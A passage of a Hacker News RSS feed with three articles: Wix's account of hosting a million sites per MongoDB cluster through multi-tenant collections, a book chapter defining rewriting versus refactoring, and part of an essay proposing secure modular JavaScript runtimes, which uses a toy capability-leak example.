<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.16.2"><div dir="ltr"><div><div id="viewer-2s5km"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster" data-pin-media="https://static.wixstatic.com/media/66bc35_6432ceb8864c4d3fa46cdd82b1d92263~mv2.jpg/v1/fit/w_3000,h_2000,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_6432ceb8864c4d3fa46cdd82b1d92263~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-cg3mc">Photo by <a href="https://unsplash.com/@shiroscope?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noopener">Shiro hatori</a> on <a href="https://unsplash.com/@shiroscope?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noopener">Unsplash</a></p><p id="viewer-7j6po"><span>When you need to store millions of databases with multiple collections efficiently, what do you do? This is exactly the question we asked ourselves a year and a half after having launched </span><a href="https://www.wix.com/corvid" target="_blank" rel="noopener"><span><u>Corvid</u></span></a><span> (then called Wix Code). Corvid is a serverless code platform for site builders, which lets developers add frontend and backend code to their Wix sites.</span></p><p id="viewer-4ipl4"><span>Part of Corvid is a product called </span><a href="https://support.wix.com/en/article/about-wix-data" target="_blank" rel="noopener"><span><u>Wix Data</u></span></a><span>. It allows anyone with a Wix website to own a document database. You can use it in multiple ways - via our visual tools to bind content in your collections to forms, tables, and other components on your site, or just access it via API from code running within your site. Think of it as “Database as a Service”, not unlike Google’s Firestore.</span></p><p id="viewer-4rkm2"><span>Behind the scenes, user data is stored in MongoDB. Which works really well, but as we are soon to find out - everything has its limits. </span></p><p id="viewer-ko3m"><span>Back at the time of Wix Code, every user collection was stored in a dedicated MongoDB collection in one of our server clusters. Each site had (and still has) mapping information, which would tell the cluster and the database where the site data is located. Collections themselves were named according to the following pattern:</span></p><p id="viewer-c6cjv">	<span>{site}@{dev/public}@{collection name}. </span></p><p id="viewer-46pqu"><span>Each user effectively had (and still has, in fact) two databases - DEV, used for development, and PUBLIC - used in the live site. Using this pattern allowed us to query all user collections simply by issuing a listCollections with a </span><a href="https://docs.mongodb.com/manual/reference/command/listCollections/" target="_blank" rel="noopener"><span><u>simple regex pattern</u></span></a><span>.</span></p><div id="viewer-4k4b6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster" data-pin-media="https://static.wixstatic.com/media/66bc35_d2b3693bdfc646d69b6681dbbde77cf6~mv2.png/v1/fit/w_1546,h_710,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_d2b3693bdfc646d69b6681dbbde77cf6~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-1nap2"><span>But then our product met success and we started growing. The first problems began at around 100k collections.</span></p><p id="viewer-11eou"><span>Even for some low-level operations we would basically list all the physical collections, which involved us querying all of the user collections via a regex query. Naturally, as the number of collections in a single database grew, listing them all started to become slower and slower. At the time all data was stored in a single cluster, all collections were split into a total of 10 databases. The fix here was quite easy - we need to split all the collections into more databases. And that is what we did.</span></p><p id="viewer-6grke"><span>But at the same time another problem had been manifesting - our backups instance started having problems. It was getting really really slow at creating backups and one time even crashed. See, in MongoDB every collection gets its own file handle. And so as the system tried to make backups, it would open a number of handlers which was equal to the number of collections we had.</span></p><p id="viewer-dhikr"><span>This meant we had to:</span></p><ol><li id="viewer-e9piu"><p><span>Increase process file handle limit, just to stop the OS from killing an instance because the limit would be exhausted;</span></p></li><li id="viewer-1t5s9"><p><span>Tune the file handle garbage collection, as Mongo was still having troubles and slowing down as soon as the number of open file handles grew into 10s of k.</span></p></li></ol><p id="viewer-e1b5k"><span>Soon after the backups issue was resolved, we saw this problem manifest in other places - like spinning up a new replica, which didn’t always succeed on the first or even on the second try. Needless to say, neither the engineering team nor the DBAs enjoyed that rush of cortisol induced by just trying to add more capacity to the system.</span></p><p id="viewer-dgeb6"><span>The obvious easy solution was to scale out with more instances, which is exactly what we did at the time. But we were lucky. Our product was growing in popularity and that meant we had to keep adding new instances every time we reached 100k new collections. And a typical website had way more than one.</span></p><p id="viewer-bo4to"><span>A year and a half after the launch, we had lots of MongoDB instances that were sitting mostly idle. Some sites are really big and receive lots of visitors, many others follow a different pattern. A new artist portfolio typically has a collection with around 30 works, which is also similar to a number of items a boat rental company has in its boat inventory collection. Given this and probably more importantly - the enthusiasm of our DBAs having to keep up with our success and having to spin up more MongoDB clusters (did I mention that Wix Data is global and each cluster has quite a few instances all over the world?) - we had to do something.</span></p><p id="viewer-e0h9j"><span>We gathered in the DBA room in one of our Tel Aviv offices and rather quickly a simple and elegant solution sprang into existence. We came home, did the design, ran some testing and the results were more than encouraging.</span></p><p id="viewer-72lq"><span><strong>Introducing “Multi-tenant Storage”</strong></span></p><p id="viewer-b83pf"><span>In the next few months we implemented what we called “multi-tenant storage”. </span></p><div id="viewer-34rej"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster" data-pin-media="https://static.wixstatic.com/media/66bc35_117e6df56c2448a9a5b174f37876d7f7~mv2.png/v1/fit/w_1550,h_700,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_117e6df56c2448a9a5b174f37876d7f7~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-b3ra"><span>While MongoDB wasn’t great at storing a million of collections (MongoDB actually made some progress in </span><a href="https://www.mongodb.com/presentations/scaling-mongodb-to-a-million-collections" target="_blank" rel="noopener"><span><u>this area</u></span></a><span> since then), it’s great at storing a few with millions of documents. And that was the basis for our solution. Storing data from multiple sites in a single collection. Thus document primary key has become:</span></p><p id="viewer-1sebm"><span><em>{</em></span>
  <span><em>site &lt;- site identification,</em></span></p><p id="viewer-4bde5">  <span><em>database &lt;- sandbox or live, </em></span></p><p id="viewer-61ftj">  <span><em>collectionName &lt;- the name of the user collection,</em></span></p><p id="viewer-1c944">  <span><em>_id &lt;- the id of the item</em></span></p><p id="viewer-6krnu"> <span><em>}</em></span></p><p id="viewer-bqn2i"><span>That meant our queries by <em>_id</em> were still fast, we could store multiple tenants in a single collection without overloading MongoDB and could also easily add indexes for everyone on the common part of the schema. For example, we added an index on our default sort key (item creation date). On top of that we implemented a tenant allocation system which allocates new tenants in the least used collections. </span></p><p id="viewer-2g8b6"><span>By keeping collections fairly small (&lt;50GB) we are also able to avoid increased read and write latency. </span></p><p id="viewer-5r0b3"><span>We also kept the ability to relocate tenants to dedicated storage to accommodate larger sites that could benefit from such isolation. For example, we can apply custom indexes or even move a tenant to a dedicated cluster.</span></p><p id="viewer-4t4bn"><span>This will sound quite obvious - but it’s important to know your tools, their strengths and weaknesses. By adjusting our storage to make use of the strengths of MongoDB we are now able to host 1 million sites and many more collections per MongoDB cluster running a few replicas around the globe (on quite a few </span><span>r4.</span><span>2xlarge</span><span> AWS instances). </span></p><div id="viewer-2mq8v"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster" data-pin-media="https://static.wixstatic.com/media/66bc35_7fc07cb46f3e4b8c9f361b4b9c617756~mv2.jpg/v1/fit/w_1650,h_1611,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_7fc07cb46f3e4b8c9f361b4b9c617756~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-edat7">This post was written by <strong>Giedrius Graževičius</strong></p><p id="viewer-17itc"><strong>For more engineering updates and insights:</strong> </p><ul><li id="viewer-e21l"><p>Follow us on: <a href="https://twitter.com/WixEng" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.facebook.com/WixEngineering/" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.linkedin.com/showcase/wix-engineering/" target="_blank" rel="noopener"><u>LinkedIn</u></a></p></li><li id="viewer-bmvq6"><p>Visit us on <a href="https://github.com/wix" target="_blank" rel="noopener"><u>GitHub</u></a> </p></li><li id="viewer-enpb"><p><a href="https://www.wix.engineering/subscribe" target="_blank" rel="noopener"><u>Subscribe to our monthly newsletter</u></a> </p></li><li id="viewer-alvjs"><p>Subscribe to our <a href="https://www.youtube.com/WixTechTalks" target="_blank" rel="noopener"><u>YouTube channel</u></a> </p></li><li id="viewer-7fn1f"><p><a href="https://medium.com/wix-engineering" target="_blank" rel="noopener"><u>Follow our Medium publication</u></a> </p></li><li id="viewer-eokcs"><p>Listen to our podcast on <a href="https://podcasts.apple.com/il/podcast/wix-engineering-podcast/id1503976848" target="_blank" rel="noopener"><u>Apple</u></a>, <a href="https://open.spotify.com/show/5CmjtjpdcKkHDnr0601uYS?si=PcOf7Rx_RUmGojFj5n7CEA" target="_blank" rel="noopener"><u>Spotify</u></a> or <a href="https://podcasts.google.com/?feed=aHR0cHM6Ly9yYW5sZXZpLmNvbS9mZWVkL3dpeF9wb2Qv&amp;ved=0CAAQ4aUDahcKEwjY3bLcy7_oAhUAAAAAHQAAAAAQAQ" target="_blank" rel="noopener"><u>Google</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.wix.engineering/post/how-we-re-able-to-host-1-million-sites-per-mongodb-cluster</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270294</guid>
            <pubDate>Tue, 25 Aug 2020 11:38:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What do we mean by rewrite and refactor?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270257">thread link</a>) | @shzfrk
<br/>
August 25, 2020 | http://www.bennorthrop.com/rewrite-or-refactor-book/chapter-1-what-we-mean-by-rewrite-and-refactor.php | <a href="https://web.archive.org/web/*/http://www.bennorthrop.com/rewrite-or-refactor-book/chapter-1-what-we-mean-by-rewrite-and-refactor.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
	<header>
		<!--
		<div class="header-title">
			<h1><a href="http://www.bennorthrop.com">Ben Northrop</a></h1><br class="mobile-only" />
			<span class="header-tagline">Decisions and software development</span>
		</div>
		<hr id="header-divider"/>
		-->
		<nav>
			
		</nav>
	</header>

		<br>
	<section id="content-title">
		<h2>
			What do we Mean by "Rewrite" and "Refactor"? 
    </h2>
    		
				
			
			<p>August 24th 2020 </p>
				<hr id="content-title-divider">
	</section>
	<br>
	

	<section id="content">	
	

	

					
<p>
We're ready to start our journey.  We have an application that's riddled with technical debt, woefully out of date, or just generally underserving its users, and so we need to understand what our best option is going forward - does it make more sense to continue to plod along and incrementally refactor?  Or do we blow it all up and rewrite from scratch?  This is the basic dilemma we'll be exploring in <a href="http://www.bennorthrop.com/rewrite-or-refactor-book/index.php">this book</a>.  So let's get going...
</p>

<p>
But not so fast!  Before we go any further we need to address the elephant in the room, which is this: for any legacy application in need of improvement, <b>what to do next is not a simple this-or-that decision</b>.  We may frame our options generally as <i>rewrite</i> or <i>refactor</i>, but these terms, as we'll see, are really just stand-ins for a whole spectrum of choices that lie before us.  
</p>

<img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Spectrum.png">

<p>
By refactoring, within the context of modernizing a legacy application, we typically mean that we're going to keep the application mostly as it is, but make some minor, internal improvements to solve specific problems (like maintainability, extensibility, etc.).  By rewriting, on the other hand, we imply that we intend to "start again from scratch", or in other words to make major changes.  
</p>

<p>
But this only begs the next question!  What exactly do we mean by <i>minor</i> and <i>major</i>?  If we plan to upgrade our frontend framework from AngularJS to React but keep the backend services as they are, is that a refactor or rewrite?  Or what about if we want to break a monolith into three different microservices, but the business logic is just copied-and-pasted into new version-control repos - is that a rewrite, refactor, or something else?  And do we even care?  Does labeling our effort really matter?
</p>

<p>
Yes, it does.  Although our job is to build working software and not philosophize about semantics, the words we use <i>do</i> make a difference.  When we suggest the path of rewriting or to refactoring, business and technology stakeholders should understand exactly what we mean and what type of effort will be entailed.  In other words, some <b>precision in our terms will help us better set expectations</b>.  Further, as we burn through some of this conceptual fog and find clearer definitions, it will also give us a more nuanced view of this decision, and move us beyond the narrow <i>rewrite or refactor</i> framing.  
</p>
<p>
So like any big journey, let's spend a little time packing before we jump in the car and go.  We don't want to show up at the beach and realize we forgot our swim suit.  
</p>


<h3>Functional Improvement</h3>
<p>
A good place to start is to define what rewrites and refactors are <i>not</i>, which are strategies to improve the functionality of an application.  This type of work, whether it's fixing defects, delivering new features, or cleaning up the user interface, we can call enhancement.  It's about improving on what the application <i>does</i> for its users, and as we'll see later, it's the normal state of development.  
</p>
<img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Functional.png">
<p>
In some cases, the scope of the functional enhancements can be quite large though.  The business may determine that the app serves the right user base, for example, but the features all need to be overhauled.  It may be tempting to call this case a rewrite as well, however we're going to make a distinction here.  Because this type of effort entails building <i>all</i> new functionality, it is basically indistinguishable from greenfield development.  When new functional requirements need to be defined, a separate system is developed from scratch, and no carry over of logic or code is possible, we will consider this to be development of a greenfield app and not a rewrite.  
</p>



<h3>What we mean by Refactoring</h3>
<p>
Adding functionality to an application is not what this book is about. Our situation is that the application generally does <i>what</i> it is expected to do, but is lacking in the <i>how</i> - in other words, the non-functional or <a href="http://www.qasigma.com/2008/12/software-quality-attributes.html">quality attributes</a> of the system.  For example, users might be happy with the set of features, but the application might be excessively difficult to maintain, or it may crash frequently, or may perform poorly under peak load.  It's when these non-functional attributes are lacking that we consider a rewrite or refactor.  
</p>
<p>With respect to refactoring, we often use this term to refer to different scopes of work. In his book <a href="https://martinfowler.com/books/refactoring.html"><i>Refactoring</i></a>, <a href="https://martinfowler.com/">Martin Fowler</a> defines it this way:
</p>

<p>
Refactoring is a disciplined technique for restructuring an existing body of code, altering its internal structure without changing its external behavior.
</p>

<p>
In this purist sense, refactoring is primarily about making the code more maintainable.   This might be decomposing long or complex functions, fixing inconsistent naming, adding unit tests, or restructuring class hierarchies, data structures, or schemas.  Note that nothing that is <i>visible</i> to the user changes, but the internal code structure is modified to make it easier to work with for developers, thus improving our productivity (and happiness!).   
</p>

<p>
In the context of our rewrite or refactor decision, however, this definition is too restrictive.  When we talk about refactoring in this context, we're not typically making a distinction between internal and external, but rather about <b>functional and non-functional</b>.  For example, we may say that we are choosing to refactor the existing code base to improve the reliability or performance of the application.  These quality attributes are technically not <i>internal</i> properties of the system (they are very visible to the users in that they directly impact them), they are just <i>non-functional</i>.  This might be a pedantic distinction, but in the spirit of precision, I think it's important to call out.   In this book we'll be using a broader definition of refactoring:
</p>

<p>
Refactoring is an approach by which an existing body of code is incrementally restructured in order  to improve the quality attributes of the system.
</p>

<p>
Lastly, it's important to note that refactoring is about iterative change.  It's making minor tweaks to the application, delivering them, and then rinse and repeat.  Layered in with functional enhancements, refactoring can keep our users happy and our codes base healthy, minimizing technical debt and feature gaps.  When neglected, however, we may need to consider the more heavy-weight alternative.
</p>

<h3>What we mean by Rewriting</h3>
<p>
Like refactoring, rewriting has the same basic goal - to improve the non-functional nature of the application.  The difference is in how much is changed.  Simply put, if refactoring is duct tape, rewriting is a sledge hammer or a back hoe.  It's not about making incremental improvements to what is there, it's about blowing it up and building anew.  With respect to the other types of development efforts we've discussed, we can visualize a rewrite this way:
</p>

<img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Quadrant.png">


<p>
We can say then that a rewrite is an effort that <b>involves major changes to the system in order to make fundamental improvements to its quality attribute</b>s.  But there is gray area.  Rewrite efforts often spill over into the other quadrants.  For example, an application may be so crippled by technical debt that it's virtually impossible to add new features.  We may choose then to rewrite  and build a new foundation to improve maintainability and extensibility (quality attributes), but during the course of that rewrite we may also sneak in a few new features to satisfy the business.  It's fundamentally a rewrite, but there is some enhancement going on as well.  
</p>
<p>
Likewise, there is some fuzziness at the boundary of rewrite and refactor.  There are lift-and-shift scenarios where the system is moved to a new platform making it essentially a different application, but the code implementation within it is mostly the same - i.e. not refactored.  This feels like a rewrite, but is it?  How much do we have to change to consider it a rewrite?
</p>

<p>Again, let's see if we can add some precision.  For the purpose of this book, let's use the following definition:
</p>

<p>
Rewriting is re-building the same functionality that exists in a legacy application but using a different language/framework, maintaining within a new code repository (not just a branch), and deploying as an entirely new artifact (possibly to a different platform - e.g. servers, hardware, serverless, client, etc.).
</p>

<p>
In other words, we're drawing some clear lines.  If, for example, we're rewriting an important function, class, or even module, but our work is made in a branch off of the mainline of our codebase, it's not a rewrite.  Likewise, if we re-implement a segment of the application, but the system itself is still deployed as the same artifact (binary, WAR, etc.), this also is not a rewrite.  Rewrites within our context are BIG.  They are about major changes that necessitate an entirely new application to be built and deployed.  Yes, there may be incremental steps along the road to get there, as we'll see later, but it is a fundamentally different effort than refactoring.  
</p>

<p>
To help clarify things in your individual case, it can be helpful to diagram this out.  For the different possible paths for modernizing or improving your application, what exactly is being changed?  Here's an example:
</p><div>

<p><img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Distinction.png"></p></div><p>
In practice, the nature of the changes may not line up neatly with the definitions of rewrite or refactor, and that's ok.  The diagram above, for example, might represent a case where we're proposing to re-implement a service using a more modern set of technologies, but while keeping the exposed API and underlying persistence structure the same.  This represents a blend of minor and major changes, so it still may not be clear precisely what to label it.  What's important, however, is that we've arrived at deeper level of detail which will help us better reason about and justify the decision.  
</p>

<p>
Now we're almost done with our preparations, but before we get on with our …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.bennorthrop.com/rewrite-or-refactor-book/chapter-1-what-we-mean-by-rewrite-and-refactor.php">http://www.bennorthrop.com/rewrite-or-refactor-book/chapter-1-what-we-mean-by-rewrite-and-refactor.php</a></em></p>]]>
            </description>
            <link>http://www.bennorthrop.com/rewrite-or-refactor-book/chapter-1-what-we-mean-by-rewrite-and-refactor.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270257</guid>
            <pubDate>Tue, 25 Aug 2020 11:34:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure Modular Runtimes]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24270195">thread link</a>) | @ispivey
<br/>
August 25, 2020 | https://guybedford.com/secure-modular-runtimes.html | <a href="https://web.archive.org/web/*/https://guybedford.com/secure-modular-runtimes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I recently posted the following Tweet with regards to the current state of the third-party security problem in the JavaScript ecosystem:

</p><blockquote><div lang="en" dir="ltr"><p>Having worked on and followed modules standards from TC39 and WhatWG to Node.js, it's so so clear that security was, is, and always will be an afterthought.</p><p>Where are the secure-by-default open platform developments? Crypto is the only community I see doing it.</p></div>— Guy Bedford (@guybedford) <a href="https://twitter.com/guybedford/status/1296935308445900801?ref_src=twsrc%5Etfw">August 21, 2020</a></blockquote> 

<p>I wanted to fill in some of the background to this from my own work on Node.js modules and security concepts, following the Agoric SES and compartment models, and from a growing feeling of the inadequacy of the Node.js, Deno and browser runtimes for supporting the third-party security needs of the ecosystem.

</p><p><em>TLDR; I think we need to think about new more secure runtimes for JS, and it should be a collaborative effort, with the components being modules, adding isolated scopes to import maps, and a careful security model plus compatibility with the existing ecosystem. <a href="#secure-modular-runtime-proposal">Skip ahead to the proposal here.</a></em>

</p><p><em>Update: Since posting this, I see that <a rel="noopener" target="_blank" href="https://github.com/Agoric/SES-shim/tree/master/packages/endo">Endo</a> and <a rel="noopener" target="_blank" href="https://github.com/LavaMoat/LavaMoat">LavaMoat</a> provide techniques very close to these directions, although neither has quite yet taken the leap that I argue is necessary that such a security system should be integrated into the primary runtime itself.</em></p>

<h2><a href="#third-party-security-problem">#</a>The Third-Party Security Problem</h2>

<p>The underlying issue is the <code>npm install</code> one. As the registry and our dependence on it continues to expand, the security gap here continues to grow in terms of the amount of untrusted code we are running on a daily basis.

</p><p>Maintainers giving up their time freely now find themselves obliged to respond to regular security issues or risk having unpatchable advisories released for their packages, which may or may not even be genuine escalations of privilege.
  We engage in security theatre to create the illusion of safety, and yet all the while everything remains highly unsecure.

</p><p>Rather than simply accepting the status quo, many companies are actively working on mitigating these security properties. The problem is that they end up creating side ecosystems or patches to the existing ecosystem, security measures that are never fundamentally designed into the ecosystem itself. Third-party security remains a huge if not impossible effort, that only dedicated teams can afford to tackle, as we see for example with these intiatives by <a rel="noopener" target="_blank" href="https://www.figma.com/blog/how-we-built-the-figma-plugin-system/">Figma</a> or <a rel="noopener" target="_blank" href="https://developer.salesforce.com/blogs/developer-relations/2017/02/lockerservice-lightning-container-third-party-libraries-lightning-components.html">Salesforce</a>.

</p><p>The <a rel="noopener" target="_blank" href="https://github.com/tc39/proposal-realms">Realms proposal</a> may give us the tools for constructing a secure runtime, but the JavaScript ecosystem conventions themselves work against supporting security restrictions.

</p><p>The general view from Chrome/v8, is that this type of third-party per-package security within the same process isn't possible:

</p><blockquote><p lang="en" dir="ltr">how is this possible post spectre</p>— Sathya Gunasekaran (@_gsathya) <a href="https://twitter.com/_gsathya/status/1297121933004353536?ref_src=twsrc%5Etfw">August 22, 2020</a></blockquote> 

<p>Now I admit I have fully bought in to the elegance of the the OCAP, SES and compartment models, the ideas shared by those at Agoric (who are long-time members of TC39). I gave a session on these concepts at the Node.js Collaboration summit.

</p><p>For all the tremendous benefits of the concept of modular security, there are certainly important questions, but I believe we should actively tackle this work and these questions, and not abandon the same-process modular security models unless they can be fully disproved.

<a name="compartment-model"></a>
</p><h2><a href="#compartment-model">#</a>The Compartment Model</h2>

<p>The gist of the compartment model builds on top of SES (<a rel="noopener" target="_blank" href="https://github.com/Agoric/ses-shim">Secure ECMAScript</a>), as proposed by Agoric, something like the following:

</p><ol>
  <li>All capabilities are imported through the module system (<code>import fetch from 'fetch'</code> kind of thing) - <em>the module resolver acts as the capability system, enforcing permissions</em>.</li>
  <li>The consequence of (1) is that <em>all global capabilities should be disabled / carefully controlled.</em></li>
  <li>JavaScript needs a whole bunch of patching to prevent prototype mutations and unintentional side channels such as <code>return { toString() {} }</code> object hooks. You have to manage package interfaces very carefully and freeze the entire global object from prototype mutation.</li>
</ol>

<p>See the talk by Mark Miller on <a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=9WdbTucMaRo">Extremely Modular Distributed JavaScript</a>, or my presentation from the Node.js Collaboration Summit,
<a rel="noopener" target="_blank" href="https://docs.google.com/presentation/d/1VUpxoxitZCINJI7jXec4i87YiYZsXr8pCSHdHY5pW30/edit?usp=sharing">Security, Modules and Node.js</a>, for a more in-depth coverage of the full model.

</p><p>The result of this model is, in theory, the ability to restrict destructive code. The date time library you npm install cannot install a trojan horse on your computer, which seems a pretty useful property to have.

</p><p>Towards (3) we already <a rel="noopener" href="https://nodejs.org/dist/latest-v14.x/docs/api/cli.html#cli_frozen_intrinsics">shipped the `--frozen-intrinsics` flag in Node.js</a>. (1) and (2) clearly require breaking changes to what we have in any existing runtimes today.</p>

<h2><a href="#criticisms">#</a>Criticisms</h2>

<p>The criticisms of this model include the Spectre class of vulnerabilities, the difficulty in providing secure cross-package interfaces, and that these ideas might sound good in theory but are impractical in real JS environments.

<a name="spectre"></a>
</p><h3><a href="#spectre">#</a>Spectre</h3>

<p>The Spectre class of attacks means that code running on the same process can use CPU reverse engineering and timing information to read secret information
used by other separate code in the same process. Think - passwords, secure tokens, etc.

</p><p>The first thing to note is that Spectre is the ability to steal secrets and not the ability to install a trojan horse on your computer. Even if we can't fully mitigate Spectre (and we can certainly try), we are still limiting destructive capabilities such as giving full disk and network access
  to random people on the internet, which is a huge win. What we are comparing this model against, is having no separate security for third-party libraries at all, which is the case in Node.js, Deno and browsers today. <em>In the case of an attack, it is better to just lose a credit card, than to lose a credit card AND have your house burnt down.</em>

</p><p>The second thing to note here is that if you have a true capability system and can carefully control network access, then the capability to exfiltrate (basically to use <code>fetch</code>), can itself be treated as a critical permission. Secrets might be discovered but not as easily shared.

</p><p>The counterargument to controlling the capability to exfiltrate is that there are always side channels to be found - the blinking of a light through whatever complex window to share the information of the secret token. It's a complex boundary to mitigate.

</p><p>Finally, in terms of genuine Spectre mitigations, Cloudflare have this same problem for their same-process deployment of Cloudflare Workers, which they recently discussed here - <a rel="noopener" target="_blank" href="https://blog.cloudflare.com/mitigating-spectre-and-other-security-threats-the-cloudflare-workers-security-model/">Mitigating Spectre and Other Security Threats: The Cloudflare Workers Security Model</a>.

</p><p>Their mitigations are summarized at the end, and roughly involve:

</p><ul>
<li>Restricting Date.now() and multi-threading via new Worker (which allows custom timer creation) to attempt to disable the time measurements necessary to initiate the attack.
</li><li>Proactively detecting the attack behaviour based on monitoring and initiating full isolation.
</li><li>Exploring memory shuffling techniques so that secret information does not remain static.
</li></ul>

<p>As Cloudflare mention, this is an active mitigation space that can continue to be developed. In theory, these similar mitigations could apply to new runtime development as well.

</p><p>The important thing to note is that these mitigation techniques do not apply to the Web platform at all as they are simply not possible (at least not without <a rel="noopener" target="_blank" href="https://github.com/tc39/proposal-realms">Realms</a>). The Google / v8 position completely makes sense, given this angle,
  but the focus I want to make is on <strong>new JavaScript runtimes</strong>, like successors to Node.js such as Deno and others, <em>which should really be exploring these security properties today</em>.

<a name="insecure-module-interfaces"></a>
</p><h3><a href="#insecure-module-interfaces">#</a>Insecure Module Interfaces</h3>

<p>The next major problem comes down to the complex interface boundary between third-party packages. For example, consider the following code:

</p><pre><code>
import { renderer } from 'renderer';
import { renderGraph } from 'graph';
import { renderTitle } from 'title';

renderer.render([renderGraph, renderTitle]);
</code></pre>

<p>In theory, <code>renderGraph</code> doesn't need any other capabilities other than the ability to call into the renderer so it can be treated as low-trust code.

</p><p>But now consider a malicious implementation of <code>renderGraph</code>:

</p><pre><code>
export function renderGraph () {
  this[1].setTitle('Changed the title');
}
</code></pre>

<p><code>renderGraph</code> knows the renderer will call it via <code>renderArray[i]()</code>, which in JavaScript will set the <code>this</code> binding to the array itself, thus giving access to the title component from the graph component.

</p><p>Yes, it's a contrived example, but it demonstrates how easily you can get capability spillage in JavaScript, and that's before we even get to information spillage eg via <code>toString()</code>.

</p><p>Locking down these sorts of inadvertant side channels means making all package interfaces out of <code>SafeFunction</code> and <code>SafeObject</code> objects that don't have these sorts of awful flaws, and it's not an easy problem to solve - this is where the bulk of the effort needs to be made.

</p><p>The other side of this to consider is that Web Assembly module interfaces don't have these same sorts of capability and information spillage that we have in JavaScript, which certainly gives hope for future ecosystems dealing with these problems.

